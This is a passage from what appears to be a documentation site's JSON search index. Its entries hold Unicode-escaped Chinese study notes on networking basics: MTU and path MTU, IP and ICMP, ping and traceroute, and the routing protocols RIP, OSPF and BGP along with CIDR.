\u94fe\u8def\u5c42/\u94fe\u8def\u5c42/#mtu","text":"\u4ee5\u592a\u7f51\u548c802.3\u5bf9\u6570\u636e\u5e27\u7684\u957f\u5ea6\u90fd\u6709\u4e00\u4e2a\u9650\u5236\uff0c\u5176\u6700\u5927\u503c\u5206\u522b\u662f1500\u548c1492\u5b57\u8282\u3002\u94fe\u8def\u5c42\u7684\u8fd9\u4e2a\u7279\u6027\u79f0\u4f5cMTU\uff0c\u6700\u5927\u4f20\u8f93\u5355\u5143\u3002 \u4e0d\u540c\u7c7b\u578b\u7684\u7f51\u7edc\u5927\u591a\u6570\u90fd\u6709\u4e00\u4e2a\u4e0a\u9650\u3002\u5982\u679cIP\u5c42\u6709\u4e00\u4e2a\u6570\u636e\u62a5\u8981\u4f20\uff0c\u800c\u4e14\u6570\u636e\u7684\u957f\u5ea6\u6bd4\u94fe\u8def\u5c42\u7684MTU\u8fd8\u5927\uff0c\u90a3\u4e48IP\u5c42\u5c31\u9700\u8981\u8fdb\u884c\u5206\u7247\uff0c\u628a\u6570\u636e\u62a5\u5206\u6210\u82e5\u5e72\u7247\uff0c\u8fd9\u6837\u6bcf\u4e00\u7247\u90fd\u5c0f\u4e8eMTU\u3002 \u60f3\u8d77\u4e86408\u8ba1\u7b97\u673a\u7f51\u7edc\u8ba1\u7b97\u6700\u5927\u4f20\u8f93\u5355\u5143\u7684\u65e5\u5b50","title":"\u6700\u5927\u4f20\u8f93\u5355\u5143 MTU"},{"location":"Base/\u8ba1\u7b97\u673a\u7f51\u7edc/2\u5c42 \u94fe\u8def\u5c42/\u94fe\u8def\u5c42/#mtu_1","text":"\u5f53\u5728\u540c\u4e00\u4e2a\u7f51\u7edc\u4e0a\u7684\u4e24\u53f0\u4e3b\u673a\u4e92\u76f8\u8fdb\u884c\u901a\u4fe1\u65f6\uff0c\u8be5\u7f51\u7edc\u7684MTU\u662f\u975e\u5e38\u91cd\u8981\u7684\u3002 \u4f46\u662f\u5982\u679c\u4e24\u53f0\u4e3b\u673a\u4e4b\u95f4\u7684\u901a\u4fe1\u8981\u901a\u8fc7\u591a\u4e2a\u7f51\u7edc\uff0c\u90a3\u4e48\u6bcf\u4e2a\u7f51\u7edc\u7684\u94fe\u8def\u5c42\u5c31\u53ef\u80fd\u6709\u4e0d\u540c\u7684MTU\u3002\u91cd\u8981\u7684\u4e0d\u662f\u4e24\u53f0\u4e3b\u673a\u6240\u5728\u7f51\u7edc\u7684MTU\u7684\u503c\uff0c\u91cd\u8981\u7684\u662f\u4e24\u53f0\u901a\u4fe1\u4e3b\u673a\u8def\u5f84\u4e2d\u7684\u6700\u5c0fMTU\uff0c\u5b83\u88ab\u79f0\u4f5c\u8def\u5f84MTU\u3002 \u4e24\u53f0\u4e3b\u673a\u4e4b\u95f4\u7684\u8def\u5f84MTU\u4e0d\u4e00\u5b9a\u662f\u4e2a\u5e38\u6570\u3002\u5b83 \u53d6\u51b3\u4e8e\u5f53\u65f6\u6240\u9009\u62e9\u7684\u8def\u7531 \u3002\u800c \u9009\u8def\u4e0d\u4e00\u5b9a\u662f\u5bf9\u79f0\u7684 \uff08\u4eceA\u5230B\u7684\u8def\u7531\u53ef\u80fd\u4e0e\u4eceB\u5230A\u7684\u8def\u7531\u4e0d\u540c\uff09\uff0c\u56e0\u6b64\u8def\u5f84MTU\u5728\u4e24\u4e2a\u65b9\u5411\u4e0a\u4e0d\u4e00\u5b9a\u662f \u4e00\u81f4\u7684 \u3002 RFC 1191\u63cf\u8ff0\u4e86\u8def\u5f84MTU\u7684\u53d1\u73b0\u673a\u5236\uff0c\u5373\u5728\u4efb\u4f55\u65f6\u5019\u786e\u5b9a\u8def\u5f84MTU\u7684\u65b9\u6cd5\u3002\u6211\u4eec\u5728\u4ecb\u7ecd\u4e86ICMP\u548cIP\u5206\u7247\u65b9\u6cd5\u4ee5\u540e\u518d\u6765\u770b\u5b83\u662f\u5982\u4f55\u64cd\u4f5c\u7684\u3002","title":"\u8def\u5f84MTU"},{"location":"Base/\u8ba1\u7b97\u673a\u7f51\u7edc/3\u5c42 \u7f51\u7edc\u5c42/\u7f51\u7edc\u5c42/","text":"\u5f15\u8a00 IP\u662fTCP/IP\u534f\u8bae\u65cf\u4e2d\u6700\u4e3a\u6838\u5fc3\u7684\u534f\u8bae\u3002\u6240\u6709\u7684TCP\uff0cUDP\uff0cICMP\u53caICMP\u6570\u636e\u90fd\u4ee5IP\u6570\u636e\u62a5\u683c\u5f0f\u4f20\u8f93\u3002 \u4e0d\u53ef\u9760\u7684\u610f\u601d\u662f\u5b83 \u4e0d\u80fd\u4fdd\u8bc1IP\u6570\u636e\u62a5\u80fd\u6210\u529f\u5730\u5230\u8fbe\u76ee\u7684\u5730 \u3002IP\u4ec5\u63d0\u4f9b\u6700\u597d\u7684\u4f20\u8f93\u670d\u52a1\u3002\u5982\u679c\u53d1\u751f\u67d0\u79cd\u9519\u8bef\u65f6\uff0c\u5982\u67d0\u4e2a\u8def\u7531\u5668\u6682\u65f6\u7528\u5b8c\u4e86\u7f13\u51b2\u533a\uff0cIP\u6709\u4e00\u4e2a\u7b80\u5355\u7684\u9519\u8bef\u5904\u7406\u7b97\u6cd5\uff1a\u4e22\u5f03\u8be5\u6570\u636e\u62a5\uff0c\u7136\u540e\u53d1\u9001ICMP\u6d88\u606f\u62a5\u7ed9\u4fe1\u6e90\u7aef\u3002 \u4efb\u4f55\u8981\u6c42\u7684\u53ef\u9760\u6027\u5fc5\u987b\u7531\u4e0a\u5c42\u6765\u63d0\u4f9b \uff08\u5982TCP\uff09\u3002 \u65e0\u8fde\u63a5\u8fd9\u4e2a\u672f\u8bed\u7684\u610f\u601d\u662f IP\u5e76\u4e0d\u7ef4\u62a4\u4efb\u4f55\u5173\u4e8e\u540e\u7eed\u6570\u636e\u62a5\u7684\u72b6\u6001\u4fe1\u606f \u3002\u6bcf\u4e2a\u6570\u636e\u62a5\u7684\u5904\u7406\u662f\u76f8\u4e92\u72ec\u7acb\u7684\u3002\u8fd9\u4e5f\u8bf4\u660e\uff0cIP\u6570\u636e\u62a5\u53ef\u4ee5\u4e0d\u6309\u53d1\u9001\u987a\u5e8f\u63a5\u6536\u3002\u5982\u679c\u4e00\u4fe1\u6e90\u5411\u76f8\u540c\u7684\u4fe1\u5bbf\u53d1\u9001\u4e24\u4e2a\u8fde\u7eed\u7684\u6570\u636e\u62a5\uff08\u5148\u662fA\uff0c\u7136\u540e\u662fB\uff09\uff0c\u6bcf\u4e2a\u6570\u636e\u62a5\u90fd\u662f\u72ec\u7acb\u5730\u8fdb\u884c\u8def\u7531\u9009\u62e9\uff0c\u53ef\u80fd\u9009\u62e9\u4e0d\u540c\u7684\u8def\u7ebf\uff0c\u56e0\u6b64B\u53ef\u80fd\u5728A\u5230\u8fbe\u4e4b\u524d\u5148\u5230\u8fbe\u3002 ICMP ICMP\u7ecf\u5e38\u88ab\u8ba4\u4e3a\u662fIP\u5c42\u7684\u4e00\u4e2a\u7ec4\u6210\u90e8\u5206 \u3002\u5b83\u4f20\u9012\u5dee\u9519\u62a5\u6587\u4ee5\u53ca\u5176\u4ed6\u9700\u8981\u6ce8\u610f\u7684\u4fe1\u606f\u3002ICMP\u62a5\u6587\u901a\u5e38\u88abIP\u5c42\u6216\u66f4\u9ad8\u5c42\u534f\u8bae\uff08TCP\u6216UDP\uff09\u4f7f\u7528\u3002\u4e00\u4e9bICMP\u62a5\u6587\u628a\u5dee\u9519\u62a5\u6587\u8fd4\u56de\u7ed9\u7528\u6237\u8fdb\u7a0b\u3002 ICMP\u62a5\u6587\u662f\u5728IP\u6570\u636e\u62a5\u5185\u90e8\u88ab\u4f20\u8f93\u7684\u3002 Ping Ping\u7a0b\u5e8f\u76ee\u7684\u662f\u4e3a\u4e86\u6d4b\u8bd5\u53e6\u4e00\u53f0\u4e3b\u673a\u662f\u5426\u53ef\u8fbe\u3002\u8be5\u7a0b\u5e8f\u53d1\u9001\u4e00\u4efdICMP\u56de\u663e\u8bf7\u6c42\u62a5\u6587\u7ed9\u4e3b\u673a\uff0c\u5e76\u7b49\u5f85\u8fd4\u56deICMP\u56de\u663e\u5e94\u7b54\u3002 Traceroute \u5c3d\u7ba1\u4e0d\u80fd\u4fdd\u8bc1\u4ece\u6e90\u7aef\u53d1\u5f80\u76ee\u7684\u7aef\u7684\u4e24\u4efd\u8fde\u7eed\u7684IP\u6570\u636e\u62a5\u5177\u6709\u76f8\u540c\u7684\u8def\u7531\uff0c\u4f46\u662f\u5927\u591a\u6570\u60c5\u51b5\u4e0b\u662f\u8fd9\u6837\u7684\u3002 Tracerout\u7a0b\u5e8f\u53ef\u4ee5\u8ba9\u6211\u4eec\u770b\u5230IP\u6570\u636e\u62a5\u4ece\u4e00\u53f0\u4e3b\u673a\u4f20\u5230\u53e6\u4e00\u53f0\u4e3b\u673a\u6240\u7ecf\u8fc7\u7684\u8def\u7531\u3002Tracerout\u7a0b\u5e8f\u8fd8\u53ef\u4ee5\u8ba9\u6211\u4eec\u4f7f\u7528IP\u6e90\u8def\u7531\u9009\u9879\u3002","title":"\u7f51\u7edc\u5c42"},{"location":"Base/\u8ba1\u7b97\u673a\u7f51\u7edc/3\u5c42 \u7f51\u7edc\u5c42/\u7f51\u7edc\u5c42/#_1","text":"IP\u662fTCP/IP\u534f\u8bae\u65cf\u4e2d\u6700\u4e3a\u6838\u5fc3\u7684\u534f\u8bae\u3002\u6240\u6709\u7684TCP\uff0cUDP\uff0cICMP\u53caICMP\u6570\u636e\u90fd\u4ee5IP\u6570\u636e\u62a5\u683c\u5f0f\u4f20\u8f93\u3002 \u4e0d\u53ef\u9760\u7684\u610f\u601d\u662f\u5b83 \u4e0d\u80fd\u4fdd\u8bc1IP\u6570\u636e\u62a5\u80fd\u6210\u529f\u5730\u5230\u8fbe\u76ee\u7684\u5730 \u3002IP\u4ec5\u63d0\u4f9b\u6700\u597d\u7684\u4f20\u8f93\u670d\u52a1\u3002\u5982\u679c\u53d1\u751f\u67d0\u79cd\u9519\u8bef\u65f6\uff0c\u5982\u67d0\u4e2a\u8def\u7531\u5668\u6682\u65f6\u7528\u5b8c\u4e86\u7f13\u51b2\u533a\uff0cIP\u6709\u4e00\u4e2a\u7b80\u5355\u7684\u9519\u8bef\u5904\u7406\u7b97\u6cd5\uff1a\u4e22\u5f03\u8be5\u6570\u636e\u62a5\uff0c\u7136\u540e\u53d1\u9001ICMP\u6d88\u606f\u62a5\u7ed9\u4fe1\u6e90\u7aef\u3002 \u4efb\u4f55\u8981\u6c42\u7684\u53ef\u9760\u6027\u5fc5\u987b\u7531\u4e0a\u5c42\u6765\u63d0\u4f9b \uff08\u5982TCP\uff09\u3002 \u65e0\u8fde\u63a5\u8fd9\u4e2a\u672f\u8bed\u7684\u610f\u601d\u662f IP\u5e76\u4e0d\u7ef4\u62a4\u4efb\u4f55\u5173\u4e8e\u540e\u7eed\u6570\u636e\u62a5\u7684\u72b6\u6001\u4fe1\u606f \u3002\u6bcf\u4e2a\u6570\u636e\u62a5\u7684\u5904\u7406\u662f\u76f8\u4e92\u72ec\u7acb\u7684\u3002\u8fd9\u4e5f\u8bf4\u660e\uff0cIP\u6570\u636e\u62a5\u53ef\u4ee5\u4e0d\u6309\u53d1\u9001\u987a\u5e8f\u63a5\u6536\u3002\u5982\u679c\u4e00\u4fe1\u6e90\u5411\u76f8\u540c\u7684\u4fe1\u5bbf\u53d1\u9001\u4e24\u4e2a\u8fde\u7eed\u7684\u6570\u636e\u62a5\uff08\u5148\u662fA\uff0c\u7136\u540e\u662fB\uff09\uff0c\u6bcf\u4e2a\u6570\u636e\u62a5\u90fd\u662f\u72ec\u7acb\u5730\u8fdb\u884c\u8def\u7531\u9009\u62e9\uff0c\u53ef\u80fd\u9009\u62e9\u4e0d\u540c\u7684\u8def\u7ebf\uff0c\u56e0\u6b64B\u53ef\u80fd\u5728A\u5230\u8fbe\u4e4b\u524d\u5148\u5230\u8fbe\u3002","title":"\u5f15\u8a00"},{"location":"Base/\u8ba1\u7b97\u673a\u7f51\u7edc/3\u5c42 \u7f51\u7edc\u5c42/\u7f51\u7edc\u5c42/#icmp","text":"ICMP\u7ecf\u5e38\u88ab\u8ba4\u4e3a\u662fIP\u5c42\u7684\u4e00\u4e2a\u7ec4\u6210\u90e8\u5206 \u3002\u5b83\u4f20\u9012\u5dee\u9519\u62a5\u6587\u4ee5\u53ca\u5176\u4ed6\u9700\u8981\u6ce8\u610f\u7684\u4fe1\u606f\u3002ICMP\u62a5\u6587\u901a\u5e38\u88abIP\u5c42\u6216\u66f4\u9ad8\u5c42\u534f\u8bae\uff08TCP\u6216UDP\uff09\u4f7f\u7528\u3002\u4e00\u4e9bICMP\u62a5\u6587\u628a\u5dee\u9519\u62a5\u6587\u8fd4\u56de\u7ed9\u7528\u6237\u8fdb\u7a0b\u3002 ICMP\u62a5\u6587\u662f\u5728IP\u6570\u636e\u62a5\u5185\u90e8\u88ab\u4f20\u8f93\u7684\u3002","title":"ICMP"},{"location":"Base/\u8ba1\u7b97\u673a\u7f51\u7edc/3\u5c42 \u7f51\u7edc\u5c42/\u7f51\u7edc\u5c42/#ping","text":"Ping\u7a0b\u5e8f\u76ee\u7684\u662f\u4e3a\u4e86\u6d4b\u8bd5\u53e6\u4e00\u53f0\u4e3b\u673a\u662f\u5426\u53ef\u8fbe\u3002\u8be5\u7a0b\u5e8f\u53d1\u9001\u4e00\u4efdICMP\u56de\u663e\u8bf7\u6c42\u62a5\u6587\u7ed9\u4e3b\u673a\uff0c\u5e76\u7b49\u5f85\u8fd4\u56deICMP\u56de\u663e\u5e94\u7b54\u3002","title":"Ping"},{"location":"Base/\u8ba1\u7b97\u673a\u7f51\u7edc/3\u5c42 \u7f51\u7edc\u5c42/\u7f51\u7edc\u5c42/#traceroute","text":"\u5c3d\u7ba1\u4e0d\u80fd\u4fdd\u8bc1\u4ece\u6e90\u7aef\u53d1\u5f80\u76ee\u7684\u7aef\u7684\u4e24\u4efd\u8fde\u7eed\u7684IP\u6570\u636e\u62a5\u5177\u6709\u76f8\u540c\u7684\u8def\u7531\uff0c\u4f46\u662f\u5927\u591a\u6570\u60c5\u51b5\u4e0b\u662f\u8fd9\u6837\u7684\u3002 Tracerout\u7a0b\u5e8f\u53ef\u4ee5\u8ba9\u6211\u4eec\u770b\u5230IP\u6570\u636e\u62a5\u4ece\u4e00\u53f0\u4e3b\u673a\u4f20\u5230\u53e6\u4e00\u53f0\u4e3b\u673a\u6240\u7ecf\u8fc7\u7684\u8def\u7531\u3002Tracerout\u7a0b\u5e8f\u8fd8\u53ef\u4ee5\u8ba9\u6211\u4eec\u4f7f\u7528IP\u6e90\u8def\u7531\u9009\u9879\u3002","title":"Traceroute"},{"location":"Base/\u8ba1\u7b97\u673a\u7f51\u7edc/3\u5c42 \u7f51\u7edc\u5c42/\u9009\u8def\u4e0e\u8def\u7531\u534f\u8bae/","text":"IP\u9009\u8def \u52a8\u6001\u9009\u8def\u534f\u8bae RIP \u9009\u8def\u4fe1\u606f\u534f\u8bae RIP\u5e38\u7528\u7684UDP\u7aef\u53e3\u53f7\u662f520\u3002 \u521d\u59cb\u5316\uff1a\u5728\u542f\u52a8\u4e00\u4e2a\u8def\u7531\u5b88\u62a4\u7a0b\u5e8f\u65f6\uff0c\u5b83\u5148\u5224\u65ad\u542f\u52a8\u4e86\u54ea\u4e9b\u63a5\u53e3\uff0c\u5e76\u5728\u6bcf\u4e2a\u63a5\u53e3\u4e0a\u53d1\u9001\u4e00\u4e2a\u8bf7\u6c42\u62a5\u6587\uff0c\u8981\u6c42\u5176\u4ed6\u8def\u7531\u5668\u53d1\u9001\u5b8c\u6574\u8def\u7531\u8868\u3002 \u63a5\u6536\u5230\u8bf7\u6c42\u3002\u5982\u679c\u8fd9\u4e2a\u8bf7\u6c42\u662f\u521a\u624d\u63d0\u5230\u7684\u7279\u6b8a\u8bf7\u6c42\uff0c\u90a3\u4e48\u8def\u7531\u5668\u5c31\u5c06\u5b8c\u6574\u7684\u8def\u7531\u8868\u53d1\u9001\u7ed9\u8bf7\u6c42\u8005\u3002\u5426\u5219\uff0c\u5c31\u5904\u7406\u8bf7\u6c42\u4e2d\u7684\u6bcf\u4e00\u4e2a\u8868\u9879\uff1a\u5982\u679c\u6709\u8fde\u63a5\u5230\u6307\u660e\u5730\u5740\u7684\u8def\u7531\uff0c\u5219\u5c06\u5ea6\u91cf\u8bbe\u7f6e\u6210\u6211\u4eec\u7684\u503c\uff0c\u5426\u5219\u5c06\u5ea6\u91cf\u7f6e\u4e3a16\uff08\u5ea6\u91cf\u4e3a16\u662f\u4e00\u79cd\u79f0\u4e3a\u201c\u65e0\u7a77\u5927\u201d\u7684\u7279\u6b8a\u503c\uff0c\u5b83\u610f\u5473\u7740\u6ca1\u6709\u5230\u8fbe\u76ee\u7684\u7684\u8def\u7531\uff09\u3002\u7136\u540e\u53d1\u56de\u54cd\u5e94\u3002 \u63a5\u6536\u5230\u54cd\u5e94\u3002\u4f7f\u54cd\u5e94\u751f\u6548\uff0c\u53ef\u80fd\u4f1a\u66f4\u65b0\u8def\u7531\u8868\u3002\u53ef\u80fd\u4f1a\u589e\u52a0\u65b0\u8868\u9879\uff0c\u5bf9\u5df2\u6709\u7684\u8868\u9879\u8fdb\u884c\u4fee\u6539\uff0c\u6216\u662f\u5c06\u5df2\u6709\u8868\u9879\u5220\u9664\u3002 \u5b9a\u671f\u9009\u8def\u66f4\u65b0\u3002\u6bcf\u8fc730\u79d2\uff0c\u6240\u6709\u6216\u90e8\u5206\u8def\u7531\u5668\u4f1a\u5c06\u5176\u5b8c\u6574\u8def\u7531\u8868\u53d1\u9001\u7ed9\u76f8\u90bb\u8def\u7531\u5668\u3002\u53d1\u9001\u8def\u7531\u8868\u53ef\u4ee5\u662f\u5e7f\u64ad\u5f62\u5f0f\u7684\uff08\u5982\u5728\u4ee5\u592a\u7f51\u4e0a\uff09\uff0c\u6216\u662f\u53d1\u9001\u7ed9\u70b9\u5bf9\u70b9\u94fe\u8def\u7684\u5176\u4ed6\u7ec8\u70b9\u7684\u3002 \u89e6\u53d1\u66f4\u65b0\u3002\u6bcf\u5f53\u4e00\u6761\u8def\u7531\u7684\u5ea6\u91cf\u53d1\u751f\u53d8\u5316\u65f6\uff0c\u5c31\u5bf9\u5b83\u8fdb\u884c\u66f4\u65b0\u3002\u4e0d\u9700\u8981\u53d1\u9001\u5b8c\u6574\u8def\u7531\u8868\uff0c\u800c\u53ea\u9700\u8981\u53d1\u9001\u90a3\u4e9b\u53d1\u751f\u53d8\u5316\u7684\u8868\u9879\u3002 OSPF \u4e0e\u91c7\u7528\u8ddd\u79bb\u5411\u91cf\u7684RIP\u534f\u8bae\u4e0d\u540c\u7684\u662f\uff0cOSPF\uff08\u5f00\u653e\u6700\u77ed\u8def\u5f84\u4f18\u5148\uff09\u662f\u4e00\u4e2a\u94fe\u8def\u72b6\u6001\u534f\u8bae\u3002\u8ddd\u79bb\u5411\u91cf\u7684\u610f\u601d\u662f\uff0cRIP\u53d1\u9001\u7684\u62a5\u6587\u5305\u542b\u4e00\u4e2a\u8ddd\u79bb\u5411\u91cf\uff08\u8df3\u6570\uff09\u3002\u6bcf\u4e2a\u8def\u7531\u5668\u90fd\u6839\u636e\u5b83\u6240\u63a5\u6536\u5230\u90bb\u7ad9\u7684\u8fd9\u4e9b\u8ddd\u79bb\u5411\u91cf\u6765\u66f4\u65b0\u81ea\u5df1\u7684\u8def\u7531\u8868\u3002 \u5728\u4e00\u4e2a\u94fe\u8def\u72b6\u6001\u534f\u8bae\u4e2d\uff0c\u8def\u7531\u5668\u5e76\u4e0d\u4e0e\u5176\u90bb\u7ad9\u4ea4\u6362\u8ddd\u79bb\u4fe1\u606f\u3002\u5b83\u91c7\u7528\u7684\u662f\u6bcf\u4e2a\u8def\u7531\u5668\u4e3b\u52a8\u5730\u6d4b\u8bd5\u4e0e\u5176\u90bb\u7ad9\u76f8\u8fde\u94fe\u8def\u7684\u72b6\u6001\uff0c\u5c06\u8fd9\u4e9b\u4fe1\u606f\u53d1\u9001\u7ed9\u5b83\u7684\u5176\u4ed6\u90bb\u7ad9\uff0c\u800c\u90bb\u7ad9\u5c06\u8fd9\u4e9b\u4fe1\u606f\u5728\u81ea\u6cbb\u7cfb\u7edf\u4e2d\u4f20\u64ad\u51fa\u53bb\u3002\u6bcf\u4e2a\u8def\u7531\u5668\u63a5\u6536\u8fd9\u4e9b\u94fe\u8def\u72b6\u6001\u4fe1\u606f\uff0c\u5e76\u5efa\u7acb\u8d77\u5b8c\u6574\u7684\u8def\u7531\u8868\u3002 OSPF\u4e0e RIP\uff08\u4ee5\u53ca\u5176\u4ed6\u9009\u8def\u534f\u8bae\uff09\u7684\u4e0d\u540c\u70b9\u5728\u4e8e\uff0c OSPF\u76f4\u63a5\u4f7f\u7528IP\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u5b83\u5e76\u4e0d\u4f7f\u7528UDP\u6216TCP\u3002\u5bf9\u4e8eip\u9996\u90e8\u7684protocol\u5b57\u6bb5\uff0cOSPF\u6709\u5176\u81ea\u5df1\u7684\u503c\u3002 BGP BGP\u662f\u4e00\u79cd\u4e0d\u540c\u81ea\u6cbb\u7cfb\u7edf\u7684\u8def\u7531\u5668\u4e4b\u95f4\u8fdb\u884c\u901a\u4fe1\u7684\u5916\u90e8\u7f51\u5173\u534f\u8bae\u3002 BGP\u7cfb\u7edf\u4e0e\u5176\u4ed6 BGP\u7cfb\u7edf\u4e4b\u95f4\u4ea4\u6362\u7f51\u7edc\u53ef\u5230\u8fbe\u4fe1\u606f\u3002\u8fd9\u4e9b\u4fe1\u606f\u5305\u62ec\u6570\u636e\u5230\u8fbe\u8fd9\u4e9b\u7f51\u7edc\u6240\u5fc5\u987b\u7ecf\u8fc7\u7684\u81ea\u6cbb\u7cfb\u7edfAS\u4e2d\u7684\u6240\u6709\u8def\u5f84\u3002\u8fd9\u4e9b\u4fe1\u606f\u8db3\u4ee5\u6784\u9020\u4e00\u5e45\u81ea\u6cbb\u7cfb\u7edf\u8fde\u63a5\u56fe\u3002\u7136\u540e\uff0c\u53ef\u4ee5\u6839\u636e\u8fde\u63a5\u56fe\u5220\u9664\u9009\u8def\u73af\uff0c\u5236\u8ba2\u9009\u8def\u7b56\u7565\u3002 BGP\u5141\u8bb8\u4f7f\u7528\u57fa\u4e8e\u7b56\u7565\u7684\u9009\u8def\u3002\u7531\u81ea\u6cbb\u7cfb\u7edf\u7ba1\u7406\u5458\u5236\u8ba2\u7b56\u7565\uff0c\u5e76\u901a\u8fc7\u914d\u7f6e\u6587\u4ef6\u5c06\u7b56\u7565\u6307\u5b9a\u7ed9 BGP\u3002\u4e0eRIP\u548cOSPF\u4e0d\u540c\u7684\u662f\uff0cBGP\u91c7\u7528TCP\u4f5c\u4e3a\u5176\u4f20\u8f93\u5c42\u534f\u8bae\u3002\u4e24\u4e2a\u8fd0\u884cBGP\u7684\u7cfb\u7edf\u4e4b\u95f4\u5efa\u7acb\u4e00\u6761TCP\u8fde\u63a5\u3002 BGP\u662f\u4e00\u4e2a\u8ddd\u79bb\u5411\u91cf\u534f\u8bae\uff0c\u4f46\u662f\u4e0e\uff08\u901a\u544a\u5230\u76ee\u7684\u5730\u5740\u8df3\u6570\u7684\uff09 RIP\u4e0d\u540c\u7684\u662f\uff0cBGP \u5217\u4e3e\u4e86\u5230\u6bcf\u4e2a\u76ee\u7684\u5730\u5740\u7684\u8def\u7531\u3002 CIDR \u65e0\u7c7b\u578b\u57df\u95f4\u9009\u8def\uff08CIDR\uff09\u662f\u4e00\u4e2a\u9632\u6b62Internet\u8def\u7531\u8868\u81a8\u80c0\u7684\u65b9\u6cd5\uff0c\u5b83\u4e5f\u79f0\u4e3a\u8d85\u7f51\u3002 CIDR\u7684\u57fa\u672c\u89c2\u70b9\u662f\u91c7\u7528\u4e00\u79cd\u5206\u914d\u591a\u4e2aip\u5730\u5740\u7684\u65b9\u5f0f\uff0c\u4f7f\u5176\u80fd\u591f\u5c06\u8def\u7531\u8868\u4e2d\u7684\u8bb8\u591a\u8868\u9879\u603b\u548c\uff08summarization\uff09\u6210\u66f4\u5c11\u7684\u6570\u76ee\u3002 \u201c\u65e0\u7c7b\u578b\u201d\u7684\u610f\u601d\u662f\u73b0\u5728\u7684\u9009\u8def\u51b3\u7b56\u662f\u57fa\u4e8e\u6574\u4e2a 32 bit IP\u5730\u5740\u7684\u63a9\u7801\u64cd\u4f5c\uff0c\u800c\u4e0d\u7ba1\u5176ip\u5730\u5740\u662fA\u7c7b\u3001B\u7c7b\u6216\u662fC\u7c7b\uff0c\u90fd\u6ca1\u6709\u4ec0\u4e48\u533a\u522b\u3002","title":"\u9009\u8def\u4e0e\u8def\u7531\u534f\u8bae"},{"location":"Base/\u8ba1\u7b97\u673a\u7f51\u7edc/3\u5c42 \u7f51\u7edc\u5c42/\u9009\u8def\u4e0e\u8def\u7531\u534f\u8bae/#ip","text":"","title":"IP\u9009\u8def"},{"location":"Base/\u8ba1\u7b97\u673a\u7f51\u7edc/3\u5c42 \u7f51\u7edc\u5c42/\u9009\u8def\u4e0e\u8def\u7531\u534f\u8bae/#_1","text":"","title":"\u52a8\u6001\u9009\u8def\u534f\u8bae"},{"location":"Base/\u8ba1\u7b97\u673a\u7f51\u7edc/3\u5c42 \u7f51\u7edc\u5c42/\u9009\u8def\u4e0e\u8def\u7531\u534f\u8bae/#rip","text":"\u9009\u8def\u4fe1\u606f\u534f\u8bae RIP\u5e38\u7528\u7684UDP\u7aef\u53e3\u53f7\u662f520\u3002 \u521d\u59cb\u5316\uff1a\u5728\u542f\u52a8\u4e00\u4e2a\u8def\u7531\u5b88\u62a4\u7a0b\u5e8f\u65f6\uff0c\u5b83\u5148\u5224\u65ad\u542f\u52a8\u4e86\u54ea\u4e9b\u63a5\u53e3\uff0c\u5e76\u5728\u6bcf\u4e2a\u63a5\u53e3\u4e0a\u53d1\u9001\u4e00\u4e2a\u8bf7\u6c42\u62a5\u6587\uff0c\u8981\u6c42\u5176\u4ed6\u8def\u7531\u5668\u53d1\u9001\u5b8c\u6574\u8def\u7531\u8868\u3002 \u63a5\u6536\u5230\u8bf7\u6c42\u3002\u5982\u679c\u8fd9\u4e2a\u8bf7\u6c42\u662f\u521a\u624d\u63d0\u5230\u7684\u7279\u6b8a\u8bf7\u6c42\uff0c\u90a3\u4e48\u8def\u7531\u5668\u5c31\u5c06\u5b8c\u6574\u7684\u8def\u7531\u8868\u53d1\u9001\u7ed9\u8bf7\u6c42\u8005\u3002\u5426\u5219\uff0c\u5c31\u5904\u7406\u8bf7\u6c42\u4e2d\u7684\u6bcf\u4e00\u4e2a\u8868\u9879\uff1a\u5982\u679c\u6709\u8fde\u63a5\u5230\u6307\u660e\u5730\u5740\u7684\u8def\u7531\uff0c\u5219\u5c06\u5ea6\u91cf\u8bbe\u7f6e\u6210\u6211\u4eec\u7684\u503c\uff0c\u5426\u5219\u5c06\u5ea6\u91cf\u7f6e\u4e3a16\uff08\u5ea6\u91cf\u4e3a16\u662f\u4e00\u79cd\u79f0\u4e3a\u201c\u65e0\u7a77\u5927\u201d\u7684\u7279\u6b8a\u503c\uff0c\u5b83\u610f\u5473\u7740\u6ca1\u6709\u5230\u8fbe\u76ee\u7684\u7684\u8def\u7531\uff09\u3002\u7136\u540e\u53d1\u56de\u54cd\u5e94\u3002 \u63a5\u6536\u5230\u54cd\u5e94\u3002\u4f7f\u54cd\u5e94\u751f\u6548\uff0c\u53ef\u80fd\u4f1a\u66f4\u65b0\u8def\u7531\u8868\u3002\u53ef\u80fd\u4f1a\u589e\u52a0\u65b0\u8868\u9879\uff0c\u5bf9\u5df2\u6709\u7684\u8868\u9879\u8fdb\u884c\u4fee\u6539\uff0c\u6216\u662f\u5c06\u5df2\u6709\u8868\u9879\u5220\u9664\u3002 \u5b9a\u671f\u9009\u8def\u66f4\u65b0\u3002\u6bcf\u8fc730\u79d2\uff0c\u6240\u6709\u6216\u90e8\u5206\u8def\u7531\u5668\u4f1a\u5c06\u5176\u5b8c\u6574\u8def\u7531\u8868\u53d1\u9001\u7ed9\u76f8\u90bb\u8def\u7531\u5668\u3002\u53d1\u9001\u8def\u7531\u8868\u53ef\u4ee5\u662f\u5e7f\u64ad\u5f62\u5f0f\u7684\uff08\u5982\u5728\u4ee5\u592a\u7f51\u4e0a\uff09\uff0c\u6216\u662f\u53d1\u9001\u7ed9\u70b9\u5bf9\u70b9\u94fe\u8def\u7684\u5176\u4ed6\u7ec8\u70b9\u7684\u3002 \u89e6\u53d1\u66f4\u65b0\u3002\u6bcf\u5f53\u4e00\u6761\u8def\u7531\u7684\u5ea6\u91cf\u53d1\u751f\u53d8\u5316\u65f6\uff0c\u5c31\u5bf9\u5b83\u8fdb\u884c\u66f4\u65b0\u3002\u4e0d\u9700\u8981\u53d1\u9001\u5b8c\u6574\u8def\u7531\u8868\uff0c\u800c\u53ea\u9700\u8981\u53d1\u9001\u90a3\u4e9b\u53d1\u751f\u53d8\u5316\u7684\u8868\u9879\u3002","title":"RIP"},{"location":"Base/\u8ba1\u7b97\u673a\u7f51\u7edc/3\u5c42 